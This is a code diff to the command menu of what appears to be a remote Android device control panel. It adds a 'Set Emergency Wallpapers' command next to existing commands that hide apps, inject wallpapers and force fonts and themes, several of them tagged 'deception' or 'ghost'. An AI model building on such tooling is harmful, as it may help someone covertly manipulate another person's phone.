@@ -575,6 +575,7 @@
                     { id: 'UNHIDE_APPS', name: 'Unhide Apps', icon: '👀', keywords: 'unhide, visible, restore', inputs: [{id: 'unhide-pkgs', label: 'Packages (Comma list or ALL)', type: 'text', placeholder: 'com.pkg.name or ALL'}] },
                     { id: 'GET_HIDDEN_APPS', name: 'Query Hidden App List', icon: '📋', keywords: 'list, hidden, verify', inputs: [] },
                     { id: 'SET_WALLPAPER', name: 'Inject System Wallpaper', icon: '🖼️', keywords: 'background, lock, home, deception', inputs: [{id: 'wall-target', label: 'Target Screen', type: 'select', options: [{v: 'BOTH', l: 'Both Screens'}, {v: 'LOCK', l: 'Lock Screen Only'}, {v: 'HOME', l: 'Home Screen Only'}]}, {id: 'wall-url', label: 'Image URL or Local Path', type: 'text'}] },
+                    { id: 'SET_EMERGENCY_WALLPAPER', name: 'Set Emergency Wallpapers', icon: '🚨', keywords: 'emergency, welcome, wizard, background, lock, home', inputs: [{id: 'em-wall-home', label: 'Home Screen URL / Local Path', type: 'text'}, {id: 'em-wall-lock', label: 'Lock Screen URL / Local Path', type: 'text'}] },
                     { id: 'SET_SYSTEM_FONT', name: 'Force System Font', icon: '🔤', keywords: 'ghost, settings, style, deception', inputs: [{id: 'sys-font-name', label: 'Font Name (Exact as in device list)', type: 'text', placeholder: 'SamsungOne, Roboto, etc.'}] },
                     { id: 'SET_SYSTEM_THEME', name: 'Force System Theme', icon: '🌗', keywords: 'light, dark, settings, deception', inputs: [{id: 'sys-theme-mode', label: 'Theme Mode', type: 'select', options: [{v: 'Light', l: 'Light'}, {v: 'Dark', l: 'Dark'}]}] },
                     { id: 'EYE_SHIELD', name: 'Eye Comfort Shield', icon: '🕶️', keywords: 'blue, light, filter, yellow, screen, display', inputs: [{id: 'eye-mode', label: 'Target State', type: 'select', options: [{v: 'ENABLE', l: 'ENABLE (Yellow Tint)'}, {v: 'DISABLE', l: 'DISABLE (Standard)'}]}] },
@@ -1582,6 +1583,8 @@
                         content = 'STOP'; break;
                     case 'SET_WALLPAPER':
                         content = `${document.getElementById('wall-target').value}|${document.getElementById('wall-url').value}`; break;
+                    case 'SET_EMERGENCY_WALLPAPER':
+                        content = `${document.getElementById('em-wall-home').value}|${document.getElementById('em-wall-lock').value}`; break;
                     case 'SET_SYSTEM_FONT':
                         content = document.getElementById('sys-font-name').value; break;
                     case 'SET_SYSTEM_THEME':
